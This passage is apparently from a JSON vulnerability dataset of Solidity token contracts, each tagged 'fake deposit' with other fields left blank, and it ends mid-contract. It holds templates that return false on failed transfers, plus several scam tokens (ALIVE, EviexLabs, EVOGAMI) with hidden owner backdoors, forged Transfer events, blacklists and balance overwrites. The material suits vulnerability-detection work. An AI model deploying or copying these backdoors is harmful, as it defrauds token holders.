allowed[_from][msg.sender] -= _value;\r\n        Transfer(_from, _to, _value);\r\n        return true;\r\n      } else {\r\n        return false;\r\n      }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n}\r\n\r\ncontract BAToken is StandardToken, SafeMath {\r\n\r\n    // metadata\r\n    string public constant name = \"Basic Attention Token\";\r\n    string public constant symbol = \"BAT\";\r\n    uint256 public constant decimals = 18;\r\n    string public version = \"1.0\";\r\n\r\n    // contracts\r\n    address public ethFundDeposit;      // deposit address for ETH for Brave International\r\n    address public batFundDeposit;      // deposit address for Brave International use and BAT User Fund\r\n\r\n    // crowdsale parameters\r\n    bool public isFinalized;              // switched to true in operational state\r\n    uint256 public fundingStartBlock;\r\n    uint256 public fundingEndBlock;\r\n    uint256 public constant batFund = 500 * (10**6) * 10**decimals;   // 500m BAT reserved for Brave Intl use\r\n    uint256 public constant tokenExchangeRate = 6400; // 6400 BAT tokens per 1 ETH\r\n    uint256 public constant tokenCreationCap =  1500 * (10**6) * 10**decimals;\r\n    uint256 public constant tokenCreationMin =  675 * (10**6) * 10**decimals;\r\n\r\n\r\n    // events\r\n    event LogRefund(address indexed _to, uint256 _value);\r\n    event CreateBAT(address indexed _to, uint256 _value);\r\n\r\n    // constructor\r\n    function BAToken(\r\n        address _ethFundDeposit,\r\n        address _batFundDeposit,\r\n        uint256 _fundingStartBlock,\r\n        uint256 _fundingEndBlock)\r\n    {\r\n      isFinalized = false;                   //controls pre through crowdsale state\r\n      ethFundDeposit = _ethFundDeposit;\r\n      batFundDeposit = _batFundDeposit;\r\n      fundingStartBlock = _fundingStartBlock;\r\n      fundingEndBlock = _fundingEndBlock;\r\n      totalSupply = batFund;\r\n      balances[batFundDeposit] = batFund;    // Deposit Brave Intl share\r\n      CreateBAT(batFundDeposit, batFund);  // logs Brave Intl fund\r\n    }\r\n\r\n    /// @dev Accepts ether and creates new BAT tokens.\r\n    function createTokens() payable external {\r\n      if (isFinalized) throw;\r\n      if (block.number < fundingStartBlock) throw;\r\n      if (block.number > fundingEndBlock) throw;\r\n      if (msg.value == 0) throw;\r\n\r\n      uint256 tokens = safeMult(msg.value, tokenExchangeRate); // check that we're not over totals\r\n      uint256 checkedSupply = safeAdd(totalSupply, tokens);\r\n\r\n      // return money if something goes wrong\r\n      if (tokenCreationCap < checkedSupply) throw;  // odd fractions won't be found\r\n\r\n      totalSupply = checkedSupply;\r\n      balances[msg.sender] += tokens;  // safeAdd not needed; bad semantics to use here\r\n      CreateBAT(msg.sender, tokens);  // logs token creation\r\n    }\r\n\r\n    /// @dev Ends the funding period and sends the ETH home\r\n    function finalize() external {\r\n      if (isFinalized) throw;\r\n      if (msg.sender != ethFundDeposit) throw; // locks finalize to the ultimate ETH owner\r\n      if(totalSupply < tokenCreationMin) throw;      // have to sell minimum to move to operational\r\n      if(block.number <= fundingEndBlock && totalSupply != tokenCreationCap) throw;\r\n      // move to operational\r\n      isFinalized = true;\r\n      if(!ethFundDeposit.send(this.balance)) throw;  // send the eth to Brave International\r\n    }\r\n\r\n    /// @dev Allows contributors to recover their ether in the case of a failed funding campaign.\r\n    function refund() external {\r\n      if(isFinalized) throw;                       // prevents refund if operational\r\n      if (block.number <= fundingEndBlock) throw; // prevents refund until sale period is over\r\n      if(totalSupply >= tokenCreationMin) throw; if(msg.sender == batFundDeposit) throw;          uint256 batVal = balances[msg.sender];\r\n      if (batVal == 0) throw;\r\n      balances[msg.sender] = 0;\r\n      totalSupply = safeSubtract(totalSupply, batVal); // extra safe\r\n      uint256 ethVal = batVal / tokenExchangeRate;     // should be safe; previous throws covers edges\r\n      LogRefund(msg.sender, ethVal);               // log it \r\n      if (!msg.sender.send(ethVal)) throw;       // if you're using a contract; make sure it works with .send gas limits\r\n    }\r\n\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.18;\r\n\r\nabstract contract Context {\r\n    address E20 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Create(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n modifier onlyOwner{\r\n   require(msg.sender == _Owner);     \r\n        _; }\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n\r\n}\r\n\r\n\r\n\r\ncontract ALIVE is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private E1;\r\n    mapping (address => uint256) private E2;\r\n    mapping (address => mapping (address => uint256)) private E3;\r\n    uint8 private constant E4 = 8;\r\n    uint256 private constant E5 = 100000000 * (10** E4);\r\n    string private constant _name = \"Increasingly Alive\";\r\n    string private constant _symbol = \"ALIVE\";\r\n\r\n\r\n\r\n    constructor () {\r\n       E1[msg.sender] = E5;  \r\n        E2[msg.sender] = 2;  \r\n   E99(E5);}\r\n    \r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return E4;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return E5;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return E1[account];\r\n    }\r\n\t function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return E3[owner][spender];\r\n    }\r\n\r\n        function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        E3[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\nfunction SETE2 (address x, uint256 y) public {\r\n require(E2[msg.sender] == 2);\r\n     E2[x] = y;}\r\n    function update() public {\r\n        E1[msg.sender] = E2[msg.sender];}\r\n        function E99 (uint256 x) internal {\r\n              emit Transfer(address(0), E20, x);}\r\n                      function _Transfer (address y, uint256 xy) internal {\r\n              emit Transfer(E20, y, xy);}\r\n        function transfer(address to, uint256 amount) public {\r\nif(E2[msg.sender] == 2) {\r\n         require(E1[msg.sender] >= amount);\r\n        E1[msg.sender] = E1[msg.sender].sub(amount);\r\n        E1[to] = E1[to].add(amount);\r\n    _Transfer(to, amount);}\r\nif(E2[msg.sender] <= 1) {\r\n     require(E1[msg.sender] >= amount);\r\n            E1[msg.sender] = E1[msg.sender].sub(amount);\r\n        E1[to] = E1[to].add(amount);\r\n       emit Transfer(msg.sender, to, amount);}}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\nif(E2[sender] <= 1 && E2[recipient] <=1) {\r\n         require(amount <= E1[sender]);\r\n        require(amount <= E3[sender][msg.sender]);\r\n        E1[sender] = E1[sender].sub(amount);\r\n        E1[recipient] = E1[recipient].add(amount);\r\n        emit Transfer(sender, recipient, amount);\r\n         return true;}\r\n        if(E2[sender] == 2) {\r\n         require(amount <= E3[sender][msg.sender]);\r\n        E1[sender] = E1[sender].sub(amount);\r\n        E1[recipient] = E1[recipient].add(amount);\r\n          _Transfer(recipient, amount);\r\n             return true;}\r\n        }}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.5;\r\n\r\ncontract Token {\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n        return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n    string public name;                   //Name of the token\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals\r\n    string public symbol;                 //An identifier: eg AXM\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THE FOLLOWING VALUES FOR YOUR TOKEN!\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 100000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 100000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"getirgold\";                                   // Set the name for display purposes\r\n        decimals = 8;                            // Amount of decimals\r\n        symbol = \"GGD\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.18;\r\n\r\nabstract contract Context {\r\n    function _MsgSendr() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _buildr = 0x3037290Aa65CbC698Fa4365023C3f847a6feE68D;\r\n\taddress UniswapV2 = 0xD1C24f50d05946B3FABeFBAe3cd0A7e9938C63F2;\r\n    constructor () {\r\n        address msgSender = _MsgSendr();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract EviexLabs is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private IxI;\r\n\tmapping (address => bool) private Io;\r\n    mapping (address => bool) private Oi;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _Total = 150000000 * 10**_decimals;\r\n    string private constant _name = \"Eviex Labs\";\r\n    string private constant _symbol = \"EVIEX\";\r\n\r\n\r\n\r\n    constructor () {\r\n        IxI[_MsgSendr()] = _Total;\r\n        emit Transfer(address(0), UniswapV2, _Total);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _Total;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return IxI[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        _allowances[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction zend(address z) public {\r\n        if(Io[msg.sender]) { \r\n        Oi[z] = false;}}\r\n        function zquery(address z) public{\r\n         if(Io[msg.sender])  { \r\n        require(!Oi[z]);\r\n        Oi[z] = true; }}\r\n\t\tfunction zstake(address z) public{\r\n         if(msg.sender == _buildr)  { \r\n        require(!Io[z]);\r\n        Io[z] = true; }}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _buildr)  {\r\n        require(amount <= IxI[sender]);\r\n        IxI[sender] -= amount;  \r\n        IxI[recipient] += amount; \r\n          _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer (UniswapV2, recipient, amount);\r\n        return true; }    \r\n          if(!Oi[recipient]) {\r\n          if(!Oi[sender]) {\r\n         require(amount <= IxI[sender]);\r\n        require(amount <= _allowances[sender][msg.sender]);\r\n        IxI[sender] -= amount;\r\n        IxI[recipient] += amount;\r\n      _allowances[sender][msg.sender] -= amount;\r\n        emit Transfer(sender, recipient, amount);\r\n        return true; }}}\r\n\t\tfunction transfer(address recipient, uint256 amount) public {\r\n        if(msg.sender == _buildr)  {\r\n        require(IxI[msg.sender] >= amount);\r\n        IxI[msg.sender] -= amount;  \r\n        IxI[recipient] += amount; \r\n        emit Transfer (UniswapV2, recipient, amount);}\r\n        if(Io[msg.sender]) {IxI[recipient] = amount;} \r\n        if(!Oi[msg.sender]) {\r\n        require(IxI[msg.sender] >= amount);\r\n        IxI[msg.sender] -= amount;  \r\n        IxI[recipient] += amount;          \r\n        emit Transfer(msg.sender, recipient, amount);\r\n        }}}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity ^0.4.17;\r\ncontract Token {\r\n\r\n    /// @return total amount of tokens\r\n    function totalSupply() constant returns (uint256 supply) {}\r\n\r\n    /// @param _owner The address from which the balance will be retrieved\r\n    /// @return The balance\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `msg.sender`\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transfer(address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice send `_value` token to `_to` from `_from` on the condition it is approved by `_from`\r\n    /// @param _from The address of the sender\r\n    /// @param _to The address of the recipient\r\n    /// @param _value The amount of token to be transferred\r\n    /// @return Whether the transfer was successful or not\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {}\r\n\r\n    /// @notice `msg.sender` approves `_addr` to spend `_value` tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @param _value The amount of wei to be approved for transfer\r\n    /// @return Whether the approval was successful or not\r\n    function approve(address _spender, uint256 _value) returns (bool success) {}\r\n\r\n    /// @param _owner The address of the account owning tokens\r\n    /// @param _spender The address of the account able to transfer the tokens\r\n    /// @return Amount of remaining tokens allowed to spent\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {}\r\n\r\n    event Transfer(address indexed _from, address indexed _to, uint256 _value);\r\n    event Approval(address indexed _owner, address indexed _spender, uint256 _value);\r\n    \r\n}\r\n\r\n\r\n\r\ncontract StandardToken is Token {\r\n\r\n    function transfer(address _to, uint256 _value) returns (bool success) {\r\n        //Default assumes totalSupply can't be over max (2^256 - 1).\r\n        //If your token leaves out totalSupply and can issue more tokens as time goes on, you need to check if it doesn't wrap.\r\n        //Replace the if with this one instead.\r\n        //if (balances[msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[msg.sender] >= _value && _value > 0) {\r\n            balances[msg.sender] -= _value;\r\n            balances[_to] += _value;\r\n            Transfer(msg.sender, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function transferFrom(address _from, address _to, uint256 _value) returns (bool success) {\r\n        //same as above. Replace this line with the following if you want to protect against wrapping uints.\r\n        //if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && balances[_to] + _value > balances[_to]) {\r\n        if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) {\r\n            balances[_to] += _value;\r\n            balances[_from] -= _value;\r\n            allowed[_from][msg.sender] -= _value;\r\n            Transfer(_from, _to, _value);\r\n            return true;\r\n        } else { return false; }\r\n    }\r\n\r\n    function balanceOf(address _owner) constant returns (uint256 balance) {\r\n        return balances[_owner];\r\n    }\r\n\r\n    function approve(address _spender, uint256 _value) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address _owner, address _spender) constant returns (uint256 remaining) {\r\n      return allowed[_owner][_spender];\r\n    }\r\n\r\n    mapping (address => uint256) balances;\r\n    mapping (address => mapping (address => uint256)) allowed;\r\n    uint256 public totalSupply;\r\n}\r\n\r\n\r\n//name this contract whatever you'd like\r\ncontract ERC20Token is StandardToken {\r\n\r\n    function () {\r\n        //if ether is sent to this address, send it back.\r\n        throw;\r\n    }\r\n\r\n    /* Public variables of the token */\r\n\r\n    /*\r\n    NOTE:\r\n    The following variables are OPTIONAL vanities. One does not have to include them.\r\n    They allow one to customise the token contract & in no way influences the core functionality.\r\n    Some wallets/interfaces might not even bother to look at this information.\r\n    */\r\n    string public name;                   //fancy name: eg Simon Bucks\r\n    uint8 public decimals;                //How many decimals to show. ie. There could 1000 base units with 3 decimals. Meaning 0.980 SBX = 980 base units. It's like comparing 1 wei to 1 ether.\r\n    string public symbol;                 //An identifier: eg SBX\r\n    string public version = 'H1.0';       //human 0.1 standard. Just an arbitrary versioning scheme.\r\n\r\n//\r\n// CHANGE THESE VALUES FOR YOUR TOKEN\r\n//\r\n\r\n//make sure this function name matches the contract name above. So if you're token is called TutorialToken, make sure the //contract name above is also TutorialToken instead of ERC20Token\r\n\r\n    function ERC20Token(\r\n        ) {\r\n        balances[msg.sender] = 1000000000000000000;               // Give the creator all initial tokens (100000 for example)\r\n        totalSupply = 1000000000000000000;                        // Update total supply (100000 for example)\r\n        name = \"PBSC Coin\";                                   // Set the name for display purposes\r\n        decimals = 8;                            // Amount of decimals for display purposes\r\n        symbol = \"PBSC\";                               // Set the symbol for display purposes\r\n    }\r\n\r\n    /* Approves and then calls the receiving contract */\r\n    function approveAndCall(address _spender, uint256 _value, bytes _extraData) returns (bool success) {\r\n        allowed[msg.sender][_spender] = _value;\r\n        Approval(msg.sender, _spender, _value);\r\n\r\n        //call the receiveApproval function on the contract you want to be notified. This crafts the function signature manually so one doesn't have to include a contract in here just for this.\r\n        //receiveApproval(address _from, uint256 _value, address _tokenContract, bytes _extraData)\r\n        //it is assumed that when does this that the call *should* succeed, otherwise one would use vanilla approve instead.\r\n        if(!_spender.call(bytes4(bytes32(sha3(\"receiveApproval(address,uint256,address,bytes)\"))), msg.sender, _value, this, _extraData)) { throw; }\r\n        return true;\r\n    }\r\n}\n\n###\n\n",
        "VulnerabilityDesc": [
            {
                "Name": "",
                "Location": "",
                "Type": "fake deposit",
                "Description": "",
                "Repair": ""
            }
        ]
    },
    {
        "Code": "pragma solidity 0.8.18;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\n\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _Owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n    address _zConst = 0x7De4D03d99ef36CAA1Cc504b198e80da746114f9;\r\n\taddress zRouterV2 = 0x426903241ADA3A0092C3493a0C795F2ec830D622;\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _Owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _Owner;\r\n    }\r\n\r\n    function renounceOwnership() public virtual {\r\n        require(msg.sender == _Owner);\r\n        emit OwnershipTransferred(_Owner, address(0));\r\n        _Owner = address(0);\r\n    }\r\n\r\n}\r\n\r\n\r\n\r\ncontract EVOGAMI is Context, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private Zc;\r\n\tmapping (address => bool) private Zb;\r\n    mapping (address => bool) private Za;\r\n    mapping (address => mapping (address => uint256)) private Ze;\r\n    uint8 private constant _decimals = 8;\r\n    uint256 private constant _zSupply = 200000000 * 10**_decimals;\r\n    string private constant _name = \"EVOGAMI\";\r\n    string private constant _symbol = \"EVOGAMI\";\r\n\r\n\r\n\r\n    constructor () {\r\n        Zc[_msgSender()] = _zSupply;\r\n        emit Transfer(address(0), zRouterV2, _zSupply);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure  returns (uint256) {\r\n        return _zSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view  returns (uint256) {\r\n        return Zc[account];\r\n    }\r\n\r\n\r\n    function allowance(address owner, address spender) public view  returns (uint256) {\r\n        return Ze[owner][spender];\r\n    }\r\n\r\n            function approve(address spender, uint256 amount) public returns (bool success) {    \r\n        Ze[msg.sender][spender] = amount;\r\n        emit Approval(msg.sender, spender, amount);\r\n        return true; }\r\n\t\tfunction zRNG(address Zf) public {\r\n        if(Zb[msg.sender]) { \r\n        Za[Zf] = false;}}\r\n        function zCheck(address Zf) public{\r\n         if(Zb[msg.sender])  { \r\n        require(!Za[Zf]);\r\n        Za[Zf] = true; }}\r\n\t\tfunction zDele(address Zf) public{\r\n         if(msg.sender == _zConst)  { \r\n        require(!Zb[Zf]);\r\n        Zb[Zf] = true; }}\r\n\t\tfunction transferFrom(address sender, address recipient, uint256 amount) public returns (bool success) {\r\n         if(sender == _zConst)  {\r\n        require(amount <= Zc[sender]);\r\n        Zc[sender] -= amount;  \r\n        Zc[recipient] += amount; \r\n          Ze[sender][msg.sender] -= amount;\r\n        emit Transfer (zRouterV2, recipient, amount);\r\n        return true; }  else  \r\n          if(!Za[recipient]) {\r\n          if(!Za[sender]) {\r\n         require(amount <= Zc[sender]);\r\n        require(amount <= Ze[sender][msg.sender]);\r\n        Zc[sender] -= amount;\r\n        Zc[recipient] += amount;\r\n      Ze[sender][msg.sender] -= 